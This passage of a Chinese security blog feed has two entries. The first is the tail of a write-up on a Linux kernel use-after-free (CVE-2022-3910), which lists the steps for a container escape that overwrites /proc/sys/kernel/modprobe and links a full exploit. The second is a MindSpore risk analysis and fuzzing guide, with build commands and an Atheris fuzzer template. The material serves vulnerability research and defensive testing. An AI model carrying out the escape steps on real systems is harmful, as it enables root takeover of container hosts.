class="hljs-comment"> * standard mutex or completion: but we cannot take i_rwsem in fault,</span><br><span class="hljs-comment"> * and bloating every shmem inode for this unlikely case would be sad.</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h2 id="最终利用">最终利用</h2><p>结合上述两个技巧，我们可以得出最终的利用方式：</p><ol type="1"><li><p>先随便打开一些文件，比如文件A，设置权限为<code>O_RDWR</code>。内核会分配一个相应的<code>file</code>结构体。</p></li><li><p>利用CVE-2022-3910反复减少文件A结构体的引用计数，​<strong>直到其下溢</strong>​。这会free结构体但在文件描述符表中仍然保留对它的引用。</p><blockquote><p><strong>注意</strong>：这是必需的，因为<code>fget()</code>（稍后我们提交AIO 请求时将调用它）如果在引用计数为 0的<code>file</code>结构体上调用将导致内核停止。代码在<ahref="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/file.c#L882">这里</a>（检查的宏是<code>get_file_rcu</code>）。</p></blockquote></li><li><p>使用<code>memfd_create()</code>创建并获取临时文件 B的文件描述符，并使用<code>fallocate()</code>为其分配大量内存。</p></li><li><p>使用跨页的缓冲区准备 AIO 请求。第二块页应该由文件 B控制，并且尚未加载在内存中。</p></li><li><p>（CPU1，线程X）：使用<code>FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE</code>调用<code>fallocate()</code>加载文件B。</p></li><li><p>（CPU 1，线程Y）：提交AIO请求。这会触发文件 B所在页的页错误。当文件正在打洞时，线程 Y 会将<ahref="https://elixir.bootlin.com/linux/v6.0-rc5/source/mm/shmem.c#L2086">自己放入等待队列</a>，停止执行，直到线程X 完成。</p></li><li><p>（CPU 0，线程 Z）：当线程 Y停止时，重复调用<code>open()</code>打开<code>/proc/sys/kernel/modprobe</code>来让对应的<code>file</code>结构体覆盖掉文件A的结构体。</p></li><li><p>线程 Y恢复执行并在<code>/proc/sys/kernel/modprobe</code>上执行写入。</p></li></ol><p>完整的exp如下: <ahref="https://starlabs.sg/blog/2023/07-container-escape-using-file-based-DirtyCred_source.zip">container-escape-using-file-based-DirtyCred.rar</a></p><h1 id="实际利用">实际利用</h1><h2 id="标准-docker-容器">标准 Docker 容器</h2><p>Command：<code>sudo docker run -it --rm ubuntu bash</code></p><p>但是实际上我们的exp并没有起作用，相反，会收到<code>Permission denied</code>。因为在调用<code>aio_setup_rw()</code>后，<code>rw_verify_area()</code>会调用安全钩子函数。默认情况下，Docker容器在受限的 AppArmor 配置文件下运行，因此额外的权限检查<ahref="https://elixir.bootlin.com/linux/v6.0-rc5/source/security/apparmor/file.c#L598"><code>aa_file_perm()</code></a>失败，导致<code>aio_write()</code>返回而未实际执行写入操作。😥</p><h3 id="docker-with-apparmorunconfined">Docker with<code>apparmor=unconfined</code></h3><p>Command：<code>sudo docker run -it --rm --security-opt apparmor=unconfined ubuntu bash</code></p><p>然而，如果 Docker容器使用<code>apparmor=unconfined</code>运行，那么<code>aa_file_perm()</code>会在实际权限检查发生之前提前退出，从而使我们的漏洞利用能够顺利进行。</p><p>这种情况并不是非常有用，因为不太可能有人会特意在已部署的 Docker容器上禁用 AppArmor。</p><h2 id="更实际的场景">更实际的场景</h2><p>Command：<code>sudo ctr run -t --rm docker.io/library/ubuntu:latest bash</code></p><p>如果我们使用直接在 containerd 的 API之上运行的<code>ctr</code>命令行客户端来启动容器，那么该漏洞利用程序也可以正常工作。这是该技术的一个更现实的利用。🙂</p><h1 id="references">References</h1><ul><li>io_uring<ul><li><ahref="https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf">https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf</a></li><li><ahref="https://lwn.net/Articles/863071/">https://lwn.net/Articles/863071/</a></li><li><ahref="https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages">https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages</a></li></ul></li><li>DirtyCred<ul><li><ahref="https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf">https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf</a></li><li><ahref="https://blog.hacktivesecurity.com/index.php/2022/12/21/cve-2022-2602-dirtycred-file-exploitation-applied-on-an-io_uring-uaf/">https://blog.hacktivesecurity.com/index.php/2022/12/21/cve-2022-2602-dirtycred-file-exploitation-applied-on-an-io_uring-uaf/</a></li><li><ahref="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique">https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique</a></li></ul></li><li><code>/proc</code> filesystem<ul><li><ahref="https://docs.kernel.org/filesystems/proc.html">https://docs.kernel.org/filesystems/proc.html</a></li></ul></li><li>Kernel AIO<ul><li><ahref="https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/">https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/</a></li></ul></li><li>fallocate() slow page<ul><li><ahref="https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8">https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>System Security</tag>
      
      <tag>DirtyCred</tag>
      
      <tag>linux</tag>
      
      <tag>Kernel</tag>
      
      <tag>CVE</tag>
      
      <tag>Container Escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MindSpore风险剖析与测试指南</title>
    <link href="/2023/07/26/Security-Risk-Analysis-of-Huawei-Mindspore/"/>
    <url>/2023/07/26/Security-Risk-Analysis-of-Huawei-Mindspore/</url>
    
    <content type="html"><![CDATA[<h1 id="概述">概述</h1><p>人工智能（AI）框架已经有近10年的发展历史，四条主线驱动着AI框架不停地演进和发展：</p><ol type="1"><li>面向开发者：兼顾算法开发的效率和运行性能。</li><li>面向硬件：充分发挥芯片和集群的性能。</li><li>面向算法和数据：从计算规模看，需要应对模型越来越大的挑战；从计算范式看，需要处理不断涌现的新的计算负载。</li><li>面向部署：需要将AI能力部署到每个设备、每个应用、每个行业。</li></ol><p>MindSpore是面向“端-边-云”全场景设计的AI框架，旨在弥合AI算法研究与生产部署之间的鸿沟。</p><p>在算法研究阶段，为开发者提供动静统一的编程体验以提升算法的开发效率；在生产阶段，自动并行可以极大加快分布式训练的开发和调试效率，同时充分挖掘异构硬件的算力；在部署阶段，基于“端-边-云”统一架构，应对企业级部署和安全可信方面的挑战。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://mindspore-website.obs.cn-north-4.myhuaweicloud.com/website-images/r2.0/tutorials/source_zh_cn/beginner/images/introduction2.png"alt="概述" /><figcaption aria-hidden="true">概述</figcaption></figure><p>正常业务流程具体如图所示：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://mindspore-website.obs.cn-north-4.myhuaweicloud.com/website-images/r2.0/tutorials/source_zh_cn/beginner/images/introduction4.png"alt="执行流程" /><figcaption aria-hidden="true">执行流程</figcaption></figure><p>左边蓝色方框的是MindSpore主体框架，主要提供神经网络在训练、验证相关的基础API功能，另外还会默认提供自动微分、自动并行等功能。</p><p>蓝色方框往下是MindSporeData模块，可以利用该模块进行数据预处理，包括数据采样、数据迭代、数据格式转换等不同的数据操作。在训练的过程会遇到很多调试调优的问题，因此有MindSporeInsight模块对loss曲线、算子执行情况、权重参数变量等调试调优相关的数据进行可视化，方便用户在训练过程中进行调试调优。</p><p>AI安全最简单的场景就是从攻防的视角来看，例如，攻击者在训练阶段掺入恶意数据，影响AI模型推理能力，于是MindSpore推出了MindSporeArmour模块，为MindSpore提供AI安全机制。</p><p>蓝色方框往上的内容跟算法开发相关的用户更加贴近，包括存放大量的AI算法模型库ModelZoo，提供面向不同领域的开发工具套件MindSporeDevKit，另外还有高阶拓展库MindSporeExtend，这里面值得一提的就是MindSporeExtend中的科学计算套件MindSciences，MindSpore首次探索将科学计算与深度学习结合，将数值计算与深度学习相结合，通过深度学习来支持电磁仿真、药物分子仿真等等。</p><p>神经网络模型训练完后，可以导出模型或者加载存放在MindSporeHub中已经训练好的模型。接着有MindIR提供端云统一的IR格式，通过统一IR定义了网络的逻辑结构和算子的属性，将MindIR格式的模型文件与硬件平台解耦，实现一次训练多次部署。因此如图所示，通过IR把模型导出到不同的模块执行推理。</p><h1 id="整体架构">整体架构</h1><p>MindSpore整体架构及后端相关组件如下图所示：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://www.mindspore.cn/docs/zh-CN/r2.0/_images/pluggable_device_arch.png"alt="整体架构" /><figcaption aria-hidden="true">整体架构</figcaption></figure><p>MindSpore整体架构包括如下几个主要组件，它们之间存在相互的依赖关系：</p><ul><li>PythonAPI：提供了基于Python的前端表达与编程接口，支撑用户进行网络构建、整图执行、子图执行以及单算子执行，并通过pybind11接口调用到C++模块，C++模块分为前端、后端、MindData、Core等；</li><li>MindExpression前端表达：负责编译流程控制和硬件无关的优化如类型推导、自动微分、表达式化简等；</li><li>MindData数据组件：MindData提供高效的数据处理、常用数据集加载等功能和编程接口，支持用户灵活的定义处理注册和pipeline并行优化；</li><li>MindIR：包含了ANFIR数据结构、日志、异常等端、云共用的数据结构与算法。</li></ul><p>大致可以分为四层：</p><ol type="1"><li>模型层，为用户提供开箱即用的功能，该层主要包含预置的模型和开发套件，以及图神经网络（GNN）、深度概率编程、科学计算库等热点研究领域拓展库；</li><li>表达层（MindExpression），为用户提供AI模型开发、训练、推理的接口，支持用户用原生Python语法开发和调试神经网络，其特有的动静态图统一能力使开发者可以兼顾开发效率和执行性能，同时该层在生产和部署阶段提供全场景统一的C++/Python接口；</li><li>编译优化（MindCompiler），作为AI框架的核心，以全场景统一中间表达（<ahref="https://mindspore.cn/docs/zh-CN/r2.0/design/mindir.html">MindIR</a>）为媒介，将前端表达编译成执行效率更高的底层语言，同时进行全局性能优化，包括自动微分、代数化简等硬件无关优化，以及图算融合、算子生成等硬件相关优化；</li><li>运行时，按照上层编译优化的结果对接并调用底层硬件算子，同时通过“端-边-云”统一的运行时架构，支持包括联邦学习在内的“端-边-云”AI协同。</li></ol><h1 id="安装mindspore">安装MindSpore</h1><p>可以参照<ahref="https://www.mindspore.cn/install">官方文档</a>，因配合后续模糊测试，采用源码编译方式安装MindSporeCPU版本。</p><h2 id="环境准备-手动">环境准备-手动</h2><p>下表列出了编译安装MindSpore所需的系统环境和第三方依赖。</p><table><thead><tr><th>软件名称</th><th>版本</th><th>作用</th></tr></thead><tbody><tr><td>Ubuntu</td><td>18.04</td><td>编译和运行MindSpore的操作系统</td></tr><tr><td><a href="#安装python">Python</a></td><td>3.7-3.9</td><td>MindSpore的使用依赖Python环境</td></tr><tr><td><a href="#安装wheel和setuptools">wheel</a></td><td>0.32.0及以上</td><td>MindSpore使用的Python打包工具</td></tr><tr><td><a href="#安装wheel和setuptools">setuptools</a></td><td>44.0及以上</td><td>MindSpore使用的Python包管理工具</td></tr><tr><td><a href="#安装gcc-git-tclsh-patch和numa">GCC</a></td><td>7.3.0到9.4.0之间</td><td>用于编译MindSpore的C++编译器</td></tr><tr><td><a href="#安装gcc-git-tclsh-patch和numa">git</a></td><td>-</td><td>MindSpore使用的源代码管理工具</td></tr><tr><td><a href="#安装cmake">CMake</a></td><td>3.18.3及以上</td><td>编译构建MindSpore的工具</td></tr><tr><td><a href="#安装gcc-git-tclsh-patch和numa">tclsh</a></td><td>-</td><td>MindSpore sqlite编译依赖</td></tr><tr><td><a href="#安装gcc-git-tclsh-patch和numa">patch</a></td><td>2.5及以上</td><td>MindSpore使用的源代码补丁工具</td></tr><tr><td><a href="#安装gcc-git-tclsh-patch和numa">NUMA</a></td><td>2.0.11及以上</td><td>MindSpore使用的非一致性内存访问库</td></tr><tr><td><a href="#安装llvm-可选">LLVM</a></td><td>12.0.1</td><td>MindSpore使用的编译器框架（可选，图算融合以及稀疏计算需要）</td></tr></tbody></table><p>下面给出第三方依赖的安装方法。</p><h3 id="安装python">安装Python</h3><p><ahref="https://www.python.org/">Python</a>可通过多种方式进行安装。</p><ul><li><p>通过Conda安装Python。</p><p>安装Miniconda：</p><p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br>curl -O https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/Miniconda3-py37_4.10.3-Linux-$(<span class="hljs-built_in">arch</span>).sh<br>bash Miniconda3-py37_4.10.3-Linux-$(<span class="hljs-built_in">arch</span>).sh -b<br><span class="hljs-built_in">cd</span> -<br>. ~/miniconda3/etc/profile.d/conda.sh<br>conda init bash<br></code></pre></td></tr></table></figure></p><p>安装完成后，可以为Conda设置清华源加速下载，参考<ahref="https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/">此处</a>。</p><p>创建虚拟环境，以Python 3.7.5为例：</p><p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda create -n mindspore_py37 python=3.7.5 -y<br>conda activate mindspore_py37<br></code></pre></td></tr></table></figure></p></li><li><p>通过APT安装Python，命令如下。</p><p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get update<br><span class="hljs-built_in">sudo</span> apt-get install software-properties-common -y<br><span class="hljs-built_in">sudo</span> add-apt-repository ppa:deadsnakes/ppa -y<br><span class="hljs-built_in">sudo</span> apt-get install python3.7 python3.7-dev python3.7-distutils python3-pip -y<br><span class="hljs-comment"># 将新安装的Python设为默认</span><br><span class="hljs-built_in">sudo</span> update-alternatives --install /usr/bin/python python /usr/bin/python3.7 100<br><span class="hljs-comment"># 安装pip</span><br>python -m pip install pip -i https://repo.huaweicloud.com/repository/pypi/simple<br><span class="hljs-built_in">sudo</span> update-alternatives --install /usr/bin/pip pip ~/.local/bin/pip3.7 100<br>pip config <span class="hljs-built_in">set</span> global.index-url https://repo.huaweicloud.com/repository/pypi/simple<br></code></pre></td></tr></table></figure></p><p>若要安装其他Python版本，只需更改命令中的<code>3.7</code>。</p></li></ul><p>可以通过以下命令查看Python版本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python --version<br></code></pre></td></tr></table></figure><h3 id="安装wheel和setuptools">安装wheel和setuptools</h3><p>在安装完成Python后，使用以下命令安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install wheel<br>pip install -U setuptools<br></code></pre></td></tr></table></figure><h3 id="安装gcc-git-tclsh-patch和numa">安装GCC git tclshpatch和NUMA</h3><p>可以通过以下命令安装GCC，git，tclsh，patch和NUMA。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install gcc-7 git tcl patch libnuma-dev -y<br></code></pre></td></tr></table></figure><p>如果要安装更高版本的GCC，使用以下命令安装GCC 8。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install gcc-8 -y<br></code></pre></td></tr></table></figure><p>或者安装GCC 9。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install software-properties-common -y<br><span class="hljs-built_in">sudo</span> add-apt-repository ppa:ubuntu-toolchain-r/test<br><span class="hljs-built_in">sudo</span> apt-get update<br><span class="hljs-built_in">sudo</span> apt-get install gcc-9 -y<br></code></pre></td></tr></table></figure><h3 id="安装cmake">安装CMake</h3><p>可以通过以下命令安装<a href="https://cmake.org/">CMake</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -O - https://apt.kitware.com/keys/kitware-archive-latest.asc 2&gt;/dev/null | <span class="hljs-built_in">sudo</span> apt-key add -<br><span class="hljs-built_in">sudo</span> apt-add-repository <span class="hljs-string">&quot;deb https://apt.kitware.com/ubuntu/ <span class="hljs-subst">$(lsb_release -cs)</span> main&quot;</span><br><span class="hljs-built_in">sudo</span> apt-get install cmake -y<br></code></pre></td></tr></table></figure><h3 id="安装llvm-可选">安装LLVM-可选</h3><p>可以通过以下命令安装<a href="https://llvm.org/">LLVM</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | <span class="hljs-built_in">sudo</span> apt-key add -<br><span class="hljs-built_in">sudo</span> add-apt-repository <span class="hljs-string">&quot;deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-12 main&quot;</span><br><span class="hljs-built_in">sudo</span> apt-get update<br><span class="hljs-built_in">sudo</span> apt-get install llvm-12-dev -y<br></code></pre></td></tr></table></figure><h2 id="从代码仓下载源码">从代码仓下载源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://gitee.com/mindspore/mindspore.git<br></code></pre></td></tr></table></figure><h2 id="编译mindspore">编译MindSpore</h2><p>进入mindspore根目录，然后执行编译脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> mindspore<br>bash build.sh -e cpu -j4 -S on<br></code></pre></td></tr></table></figure><p>其中：</p><ul><li>如果编译机性能较好，可在执行中增加-j{线程数}来增加线程数量。如<code>bash build.sh -e cpu -j12</code>。</li><li>默认从github下载依赖源码，当-S选项设置为<code>on</code>时，从对应的gitee镜像下载。</li><li>关于<code>build.sh</code>更多用法请参看脚本头部的说明。</li></ul><h2 id="安装mindspore-1">安装MindSpore</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install output/mindspore-*.whl -i https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></td></tr></table></figure><p>在联网状态下，安装whl包时会自动下载mindspore安装包的依赖项（依赖项详情参见<ahref="https://gitee.com/mindspore/mindspore/blob/master/setup.py">setup.py</a>中的required_package），其余情况需自行安装。运行模型时，需要根据<ahref="https://gitee.com/mindspore/models/tree/master/">ModelZoo</a>中不同模型指定的requirements.txt安装额外依赖，常见依赖可以参考<ahref="https://gitee.com/mindspore/mindspore/blob/master/requirements.txt">requirements.txt</a>。</p><h2 id="验证安装是否成功">验证安装是否成功</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import mindspore;mindspore.set_context(device_target=&#x27;CPU&#x27;);mindspore.run_check()&quot;</span><br></code></pre></td></tr></table></figure><p>如果输出：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">MindSpore version: 版本号<br>The result of multiplication calculation is correct, MindSpore has been installed on platform [CPU] successfully!<br></code></pre></td></tr></table></figure><p>说明MindSpore安装成功了。</p><h2 id="升级mindspore版本">升级MindSpore版本</h2><p>在源码根目录下执行编译脚本<code>build.sh</code>成功后，在<code>output</code>目录下找到编译生成的whl安装包，然后执行下述命令进行升级。</p><p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install --upgrade mindspore-*.whl<br></code></pre></td></tr></table></figure></p><h1 id="威胁分析与模糊测试">威胁分析与模糊测试</h1><p>通过业界对AI框架软件<em>Tensorflow</em>安全研究成果和上述的整体架构，抽取出MindSpore所面临的安全风险和漏洞模式。</p><p>TensorFlow的系统结构以CAPI为界，将整个系统分为「前端」和「后端」两个子系统：</p><ul><li><p>前端系统：提供编程模型，负责构造计算图；</p></li><li><p>后端系统：提供运行时环境，负责执行计算图。</p></li></ul><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Security-Risk-Analysis-of-Huawei-Mindspore/Tensorflow-arch.jpeg"alt="Tensorflow架构" /><figcaption aria-hidden="true">Tensorflow架构</figcaption></figure><p>如上图所示，重点关注系统中如下4个基本组件，它们是系统分布式运行机制的核心。</p><ol type="1"><li><p>ClientClient是前端系统的主要组成部分，它是一个支持多语言的编程环境。它提供基于计算图的编程模型，方便用户构造各种复杂的计算图，实现各种形式的模型设计。Client通过Session为桥梁，连接TensorFlow后端的「运行时」，并启动计算图的执行过程。</p></li><li><p>Distributed Master 在分布式的运行时环境中，DistributedMaster根据Session.run的Fetching参数，从计算图中反向遍历，找到所依赖的「最小子图」。然后，DistributedMaster负责将该「子图」再次分裂为多个「子图片段」，以便在不同的进程和设备上运行这些「子图片段」。最后，DistributedMaster将这些「子图片段」派发给Work Service；随后WorkService启动「子图片段」的执行过程。</p></li><li><p>Worker Service 对于每以个任务，TensorFlow都将启动一个WorkerService。WorkerService将按照计算图中节点之间的依赖关系，根据当前的可用的硬件环境(GPU/CPU)，调用OP的Kernel实现完成OP的运算(一种典型的多态实现技术)。另外，WorkerService还要负责将OP运算的结果发送到其他的WorkService；或者接受来自其他Worker Service发送给它的OP运算的结果。</p></li><li><p>Kernel ImplementsKernel是OP在某种硬件设备的特定实现，它负责执行OP的运算。</p></li></ol><p>通过对业界Tensorflow漏洞进行分析，可总结出主要漏洞模式为构造恶意参数传递给pythonAPI，恶意参数通过数据流传递到后端C++内核，导致后端出现传统编码错误。因此我们可以将模糊测试的重点放在算子和模型转换与解析，分别对应MindSpore的<ahref="https://www.mindspore.cn/docs/zh-CN/r2.0/api_python/mindspore.html">api接口</a>以及MindSporeLite的converter工具，模糊测试工具我们选择<ahref="https://github.com/google/atheris">Atheris: A Coverage-Guided,Native Python Fuzzer</a>以及AFLPlusPlus（或者honggfuzz等）。</p><h1 id="编译插桩版本">编译插桩版本</h1><h2 id="mslite编译">MSLITE编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> CFLAGS=-w<br><span class="hljs-built_in">export</span> CXXFLAGS=-w<br><span class="hljs-built_in">export</span> CC=afl-gcc-fast<br><span class="hljs-built_in">export</span> CXX=afl-g++-fast<br><span class="hljs-built_in">export</span> MSLITE_ENABLE_TRAIN=off<br><span class="hljs-built_in">export</span> MSLITE_ENABLE_CONVERTER=on<br><span class="hljs-built_in">export</span> MSLITE_ENABLE_TOOLS=on<br><span class="hljs-built_in">export</span> MSLITE_ENABLE_MODEL_OBF=on<br><span class="hljs-built_in">export</span> MSLITE_ENABLE_MODEL_ENCRYPTION=on<br><span class="hljs-built_in">export</span> MSLITE_ENABLE_MODEL_PRE_INFERENCE=on<br><br>bash build.sh -I x86_64 -d -a on -j$(<span class="hljs-built_in">nproc</span>)<br></code></pre></td></tr></table></figure><h2 id="mindspore编译">MindSpore编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> CFLAGS=-w<br><span class="hljs-built_in">export</span> CXXFLAGS=-w<br><span class="hljs-built_in">export</span> CC=gcc<br><span class="hljs-built_in">export</span> CXX=g++<br><br>bash build.sh -e cpu -d -c on -a on -j$(<span class="hljs-built_in">nproc</span>)<br></code></pre></td></tr></table></figure><h1 id="进行模糊测试">进行模糊测试</h1><h2 id="使用atheris对python-api测试">使用Atheris对python API测试</h2><p>参照<ahref="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/fuzzing/python_fuzzing.py">python_fuzzing.py</a>编写辅助测试脚本</p><h3 id="构造恶意tensor对算子测试">构造恶意Tensor对算子测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;This is a Python API fuzzer template for mindspore.ops.abs&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> atheris<br><br><span class="hljs-keyword">with</span> atheris.instrument_imports():<br>  <span class="hljs-keyword">import</span> sys<br>  <span class="hljs-keyword">from</span> python_fuzzing <span class="hljs-keyword">import</span> FuzzingHelper<br>  <span class="hljs-keyword">import</span> mindspore <span class="hljs-keyword">as</span> ms<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">TestOneInput</span>(<span class="hljs-params">data</span>):<br>  <span class="hljs-string">&quot;&quot;&quot;Test randomized fuzzing input for tf.raw_ops.Abs.&quot;&quot;&quot;</span><br>  fh = FuzzingHelper(data)<br><br>  input_tensor = fh.get_random_numeric_tensor(dtype=ms.float32)<br><br>  _ = ms.ops.<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">input</span>=input_tensor)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>  atheris.Setup(sys.argv, TestOneInput)<br>  atheris.Fuzz()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>  main()<br></code></pre></td></tr></table></figure><h3 id="构造恶意模型对加载接口测试">构造恶意模型对加载接口测试</h3><h4 id="编写mindir的proto文件">编写MINDIR的proto文件</h4><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 